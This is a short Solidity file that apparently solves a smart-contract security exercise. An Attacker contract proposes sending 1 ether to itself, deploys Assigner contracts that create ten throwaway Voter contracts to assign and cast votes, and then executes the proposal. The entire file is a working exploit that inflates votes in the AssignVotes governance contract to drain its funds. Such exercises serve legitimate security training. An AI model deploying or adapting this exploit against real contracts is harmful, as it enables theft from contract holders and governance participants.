pragma solidity 0.8.15;

import "./AssignVotes.sol";

contract Attacker {
    AssignVotes assignVotes;

    constructor(address _assignVotes) {
        assignVotes = AssignVotes(_assignVotes);
        assignVotes.createProposal(address(this), "", 1 ether);

        new Assigner(address(_assignVotes));
        new Assigner(address(_assignVotes));

        assignVotes.execute(0);
    }
}

contract Assigner {
    constructor(address _assignVotes) {
        for (uint256 i = 0; i < 5; i++) {
            Voter voter = new Voter();
            AssignVotes(_assignVotes).assign(address(voter));
            voter.vote(_assignVotes, 0);
        }
    }
}

contract Voter {
    function vote(address _assignVotes, uint256 proposal) public {
        AssignVotes(_assignVotes).vote(proposal);
    }
}
